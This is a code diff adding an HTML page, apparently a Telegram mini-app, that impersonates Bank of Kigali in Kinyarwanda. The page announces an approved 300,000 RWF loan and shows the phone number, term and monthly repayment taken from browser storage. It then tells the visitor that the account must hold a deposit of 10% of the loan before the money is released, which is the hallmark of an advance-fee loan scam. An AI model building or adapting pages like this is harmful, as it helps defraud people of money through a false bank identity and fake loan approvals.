@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="rw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bank of Kigali - Byagenze Neza</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --bk-blue: #002b49;
+            --bk-blue-gradient: linear-gradient(180deg, #003f6b 0%, #002b49 100%);
+            --bg-blue: #002b49;
+            --card-bg: #ffffff;
+            --text-dark: #0f172a;
+            --text-gray: #64748b;
+            --warning-bg: #fefce8;
+            --warning-border: #fef08a;
+            --warning-title: #ca8a04;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-blue);
+            margin: 0;
+            padding: 20px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .screen-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: var(--card-bg);
+            border-radius: 28px;
+            padding: 30px 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .check-circle {
+            width: 80px;
+            height: 80px;
+            background: var(--bk-blue-gradient);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 16px rgba(0, 43, 73, 0.3);
+        }
+
+        .congrats-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #0f172a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .sub-text {
+            color: var(--text-gray);
+            font-size: 15px;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        .amount-box {
+            width: 100%;
+            background: var(--bk-blue-gradient);
+            border-radius: 16px;
+            padding: 22px 15px;
+            text-align: center;
+            color: white;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0, 43, 73, 0.25);
+        }
+
+        .amount-label {
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            opacity: 0.95;
+            margin-bottom: 8px;
+        }
+
+        .amount-value {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+        }
+
+        .info-card {
+            width: 100%;
+            background-color: var(--warning-bg);
+            border: 1.5px solid var(--warning-border);
+            border-radius: 16px;
+            padding: 20px 18px;
+            margin-bottom: 25px;
+        }
+
+        .info-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            color: var(--warning-title);
+            font-weight: 800;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .info-body {
+            font-size: 13.5px;
+            line-height: 1.55;
+            color: #475569;
+        }
+
+        .details-list {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .details-heading {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .detail-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 16px;
+        }
+
+        .icon-bg {
+            width: 44px;
+            height: 44px;
+            background-color: #f1f5f9;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .detail-label {
+            font-size: 11px;
+            color: var(--text-gray);
+            text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        .detail-val {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .action-title {
+            width: 100%;
+            font-weight: 800;
+            margin: 15px 0 12px;
+            color: var(--bk-blue);
+            font-size: 15px;
+        }
+
+        .btn-list {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-white {
+            background: white;
+            border: 1px solid #e2e8f0;
+            padding: 14px 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            color: var(--text-dark);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+        }
+
+        .next-steps {
+            width: 100%;
+            background-color: #f8fafc;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .home-btn {
+            background-color: var(--bk-blue);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="screen-container">
+        
+        <div class="check-circle">✓</div>
+        
+        <div class="congrats-title">
+            <span>🎉</span> Turabashimiye!
+        </div>
+
+        <div class="sub-text">
+            Inguzanyo yawe <b>yemejwe neza!</b> Amafaranga azoherezwa kuri konti yawe vuba.
+        </div>
+
+        <div class="amount-box">
+            <div class="amount-label">AMAFARANGA YEMEJWE</div>
+            <div class="amount-value" id="display-amount">300 000 RWF</div>
+        </div>
+
+        <div class="info-card">
+            <div class="info-header">⚠️ AMABWIRIZA Y'INGUZANYO</div>
+            <div class="info-body">
+                Konti yawe ya Bank of Kigali igomba kuba ikora kandi ifite amafaranga y'ishingiro angana na <b>10% y'inguzanyo watsindiye</b> kugira ngo yoherezwe ku buryo bwihuse. Aya mafaranga azasubizwa nyuma y'igihe cyo kwishyura.
+            </div>
+        </div>
+
+        <div class="details-list">
+            <div class="details-heading">
+                <span>💳</span> Ibisobanuro by'Inguzanyo
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">🇷🇼</div>
+                <div>
+                    <div class="detail-label">NIMERO YA TELEFONI</div>
+                    <div class="detail-val" id="display-phone">+250 ...</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">💵</div>
+                <div>
+                    <div class="detail-label">KUBYISHYURA BURI KWEZI</div>
+                    <div class="detail-val" id="display-monthly">27 000 RWF</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📅</div>
+                <div>
+                    <div class="detail-label">IGIHE CY'INGUZANYO</div>
+                    <div class="detail-val" id="display-term">Amezi 12</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📈</div>
+                <div>
+                    <div class="detail-label">INYUNGU (APR)</div>
+                    <div class="detail-val">8% APR</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="action-title">Ibikorwa Byihuse</div>
+        <div class="btn-list">
+            <div class="btn-white">💰 Kubitsa</div>
+            <div class="btn-white">💸 Kubikuza</div>
+            <div class="btn-white">📄 Amasezerano</div>
+        </div>
+
+        <div class="next-steps">
+            <div style="font-weight: 800; color: var(--bk-blue); margin-bottom: 6px; font-size: 14px;">📱 Ibikurikira:</div>
+            <div style="font-size: 13px; color: var(--text-gray); line-height: 1.45;">
+                Urakira ubutumwa bwa SMS n'email bifite ibisobanuro mu masaha 24 ari imbere.
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/page1'">🏠 Subira ahabanza</button>
+
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+            const loanAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount') || "300000";
+            const loanTerm = localStorage.getItem('loan_term') || localStorage.getItem('duration') || "12";
+            const monthlyPay = localStorage.getItem('monthly_repayment') || "27000";
+
+            const formattedAmount = Number(loanAmount).toLocaleString('en-US') + " RWF";
+            const formattedMonthly = Number(monthlyPay).toLocaleString('en-US') + " RWF";
+            const formattedPhone = savedPhone ? `+250 ${savedPhone.replace(/^\+?250/, '')}` : "+250 ...";
+
+            document.getElementById('display-amount').innerText = formattedAmount;
+            document.getElementById('display-phone').innerText = formattedPhone;
+            document.getElementById('display-term').innerText = `Amezi ${loanTerm}`;
+            document.getElementById('display-monthly').innerText = formattedMonthly;
+        });
+    </script>
+</body>
+</html>
